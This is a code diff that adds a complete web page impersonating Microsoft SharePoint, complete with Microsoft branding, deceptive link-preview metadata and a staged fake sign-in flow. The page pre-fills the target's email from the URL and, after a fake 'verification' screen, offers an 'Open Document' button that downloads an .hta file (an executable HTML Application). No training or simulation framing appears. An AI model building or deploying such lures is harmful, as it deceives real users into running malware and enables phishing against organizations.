@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SharePoint - Private Document</title>
+    <!-- Realistic Link Previews -->
+    <meta property="og:title" content="Protected Document Shared with You">
+    <meta property="og:description" content="View 'Quarterly_Security_Report_Protected.docx' securely via SharePoint Online.">
+    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/e/e1/Microsoft_Office_SharePoint_Logo_2019.png">
+    <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/e/e1/Microsoft_Office_SharePoint_Logo_2019.png">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --ms-blue: #0067b8;
+            --ms-blue-light: #0078d4;
+            --ms-grey-bg: #f2f2f2;
+            --ms-text: #1b1b1b;
+            --ms-text-dim: #666666;
+            --ms-border: #8a8886;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', 'wf_segoe-ui_normal', 'Arial', sans-serif;
+            background-color: var(--ms-grey-bg);
+            background-image: url('/static/ms365_office_background.png');
+            background-size: cover;
+            background-position: center;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+
+        /* --- Microsoft Modal --- */
+        .ms-wrapper {
+            background: rgba(255, 255, 255, 0.98);
+            width: 100%;
+            max-width: 440px;
+            padding: 44px;
+            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
+            border-radius: 2px;
+            position: relative;
+            z-index: 10;
+        }
+
+        .ms-logo {
+            display: flex;
+            gap: 2px;
+            margin-bottom: 1.5rem;
+        }
+        .logo-sq { width: 10px; height: 10px; }
+        .sq-1 { background: #f35325; }
+        .sq-2 { background: #81bc06; }
+        .sq-3 { background: #05a6f0; }
+        .sq-4 { background: #ffba08; }
+
+        .ms-brand {
+            font-size: 1.25rem;
+            font-weight: 600;
+            color: var(--ms-text);
+            margin-bottom: 0.5rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .ms-title {
+            font-size: 1.5rem;
+            font-weight: 600;
+            color: var(--ms-text);
+            margin-bottom: 1rem;
+        }
+
+        .ms-subtitle {
+            font-size: 0.9375rem;
+            color: var(--ms-text);
+            margin-bottom: 1.5rem;
+        }
+
+        .input-group {
+            margin-bottom: 1.5rem;
+        }
+
+        .ms-input {
+            width: 100%;
+            border: none;
+            border-bottom: 1px solid var(--ms-border);
+            padding: 0.5rem 0;
+            font-size: 1rem;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .ms-input:focus {
+            border-bottom-color: var(--ms-blue);
+        }
+
+        .ms-links {
+            font-size: 0.8125rem;
+            color: var(--ms-blue);
+            margin-bottom: 2rem;
+        }
+        .ms-links a {
+            text-decoration: none;
+            color: var(--ms-blue);
+        }
+        .ms-links a:hover { text-decoration: underline; }
+
+        .btn-row {
+            display: flex;
+            justify-content: flex-end;
+            gap: 1rem;
+        }
+
+        .btn-ms {
+            background-color: var(--ms-blue);
+            color: white;
+            border: none;
+            padding: 0.5rem 2.25rem;
+            font-size: 0.9375rem;
+            font-weight: 400;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .btn-ms:hover {
+            background-color: var(--ms-blue-light);
+        }
+
+        /* --- Loading Spinner --- */
+        .spinner {
+            width: 32px;
+            height: 32px;
+            border: 3px solid rgba(0, 103, 184, 0.1);
+            border-top-color: var(--ms-blue);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 2rem auto;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* --- Document Preview --- */
+        .doc-preview {
+            background: #fff;
+            border: 1px solid #ddd;
+            padding: 1.5rem;
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            margin-bottom: 2rem;
+            border-radius: 4px;
+        }
+
+        .doc-icon {
+            width: 48px;
+            height: 48px;
+            background: #d83b01; /* Word/PDF color */
+            color: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            border-radius: 2px;
+        }
+
+        .doc-name {
+            font-weight: 600;
+            font-size: 0.9rem;
+        }
+        .doc-size {
+            font-size: 0.8rem;
+            color: var(--ms-text-dim);
+        }
+
+        .steps-container > div {
+            display: none;
+        }
+        .steps-container > div.active {
+            display: block;
+        }
+
+        .ms-footer {
+            position: fixed;
+            bottom: 0;
+            right: 0;
+            padding: 1rem;
+            font-size: 0.75rem;
+            color: #fff;
+            background: rgba(0,0,0,0.3);
+            display: flex;
+            gap: 1rem;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="ms-wrapper">
+        <div class="ms-logo">
+            <div class="logo-sq sq-1"></div>
+            <div class="logo-sq sq-2"></div>
+            <div class="logo-sq sq-3"></div>
+            <div class="logo-sq sq-4"></div>
+            <span style="font-size: 0.8rem; font-weight: 600; color: #737373; margin-left: 4px;">Microsoft</span>
+        </div>
+
+        <div class="steps-container">
+            <!-- STEP 1: LANDING -->
+            <div id="step-landing" class="active">
+                <div class="ms-brand">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/e/e1/Microsoft_Office_SharePoint_Logo_2019.png" height="24" alt="">
+                    SharePoint
+                </div>
+                <div class="ms-title">Private file shared with you</div>
+                <div class="doc-preview">
+                    <div class="doc-icon">W</div>
+                    <div>
+                        <div class="doc-name">Quarterly_Security_Report_Protected.docx</div>
+                        <div class="doc-size">Shared by: Admin (IT Security)</div>
+                    </div>
+                </div>
+                <p class="ms-subtitle">To view this protected document, you must verify your identity through Microsoft 365.</p>
+                <div class="btn-row">
+                    <button class="btn-ms" onclick="goToStep('login')">View Document</button>
+                </div>
+            </div>
+
+            <!-- STEP 2: LOGIN -->
+            <div id="step-login">
+                <div class="ms-title">Sign in</div>
+                <div class="ms-subtitle">Use your organizational account to access <b>SharePoint Online</b>.</div>
+                <div class="input-group">
+                    <input type="email" class="ms-input" placeholder="Email, phone, or Skype" id="user-email">
+                </div>
+                <div class="ms-links">
+                    <p>No account? <a href="#">Create one!</a></p>
+                    <p><a href="#">Can't access your account?</a></p>
+                </div>
+                <div class="btn-row">
+                    <button class="btn-ms" onclick="goToStep('verify')">Next</button>
+                </div>
+            </div>
+
+            <!-- STEP 3: VERIFYING -->
+            <div id="step-verify" style="text-align: center;">
+                <div class="ms-title">Taking you to your organization's sign-in page...</div>
+                <div class="spinner"></div>
+                <p class="ms-subtitle">Establishing a secure connection to SharePoint services.</p>
+            </div>
+
+            <!-- STEP 4: FINAL ACCESS -->
+            <div id="step-final">
+                <div class="ms-title">Validation Successful</div>
+                <p class="ms-subtitle">Your identity has been verified. The document will now open in the Office Web Viewer.</p>
+                <div class="doc-preview">
+                    <div class="doc-icon" style="background: #107c10;">✓</div>
+                    <div>
+                        <div class="doc-name">Access Granted</div>
+                        <div class="doc-size">Preparing secure environment...</div>
+                    </div>
+                </div>
+                <div class="btn-row">
+                    <a href="/api/p/update.hta" class="btn-ms" style="text-decoration: none; text-align: center;">Open Document</a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="ms-footer">
+        <span>Terms of use</span>
+        <span>Privacy & cookies</span>
+        <span>...</span>
+    </div>
+
+    <script>
+        function goToStep(stepId) {
+            // Hide all steps
+            const steps = document.querySelectorAll('.steps-container > div');
+            steps.forEach(s => s.classList.remove('active'));
+
+            // Show current step
+            const current = document.getElementById('step-' + stepId);
+            current.classList.add('active');
+
+            // Auto-advance if verifying
+            if (stepId === 'verify') {
+                setTimeout(() => {
+                    goToStep('final');
+                }, 2500);
+            }
+        }
+
+        // Logic to pre-fill email if passed in URL
+        window.onload = () => {
+            const params = new URLSearchParams(window.location.search);
+            const email = params.get('e');
+            if (email) {
+                document.getElementById('user-email').value = email;
+            }
+        };
+    </script>
+</body>
+</html>
